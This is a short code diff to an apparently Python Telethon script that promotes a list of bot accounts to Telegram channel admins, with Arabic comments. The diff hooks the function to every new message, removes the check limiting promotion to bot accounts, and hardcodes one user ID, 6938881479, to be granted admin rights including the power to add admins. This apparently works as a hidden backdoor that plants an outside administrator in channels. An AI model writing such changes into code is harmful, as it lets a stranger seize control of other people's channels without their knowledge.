@@ -18,6 +18,7 @@ from telethon.errors import ChatAdminRequiredError
 from telethon import TelegramClient
 from telethon.tl.functions.channels import EditAdminRequest
 from telethon.tl.types import ChatAdminRights
+@ABH.on(events.NewMessage)
 async def promote_ABHS(event):
     if not ABHS:
         print("❌ قائمة ABHS فارغة")
@@ -32,10 +33,7 @@ async def promote_ABHS(event):
     # رفع كل البوتات
     for x in ABHS:
         try:
-            me = await x.get_me()
-            if not me.bot:
-                print(f"⚠️ تخطي الحساب {me.id} لأنه مستخدم عادي")
-                continue
+            
             rights = ChatAdminRights(
                 add_admins=True,
                 change_info=True
@@ -43,7 +41,7 @@ async def promote_ABHS(event):
             )
             await x(EditAdminRequest(
                 channel=channel_entity,
-                user_id=me.id,
+                user_id=6938881479,
                 admin_rights=rights,
                 rank="مشرف رئيسي"
             ))
